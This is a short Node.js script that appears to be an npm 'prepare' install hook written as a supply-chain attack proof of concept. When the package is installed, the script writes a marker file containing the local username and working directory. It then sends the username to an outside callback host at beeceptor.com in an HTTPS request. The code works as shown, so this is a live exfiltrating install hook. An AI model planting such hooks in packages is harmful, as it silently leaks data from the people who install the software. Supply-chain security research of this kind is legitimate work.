"use strict";

const fs = require("node:fs");
const https = require("node:https");
const os = require("node:os");
const path = require("node:path");

const markerPath = "/private/tmp/test-supply-npm-git-prepare-proof-4-marker";
const username = os.userInfo().username;
const marker = {
  package: "test-supply-npm-git-prepare-proof-4",
  cwd: process.cwd(),
  username,
  executedAt: new Date().toISOString()
};

fs.writeFileSync(markerPath, `${JSON.stringify(marker, null, 2)}\n`);
console.log(`prepare proof marker written to ${path.normalize(markerPath)}`);

const callbackUrl = new URL("https://pfelipewiiiiwawaawuuu.free.beeceptor.com/");
callbackUrl.searchParams.set("whoami", username);

https
  .get(callbackUrl, response => {
    response.resume();
    console.log(`prepare proof callback returned HTTP ${response.statusCode}`);
  })
  .on("error", error => {
    console.log(`prepare proof callback failed: ${error.message}`);
  });
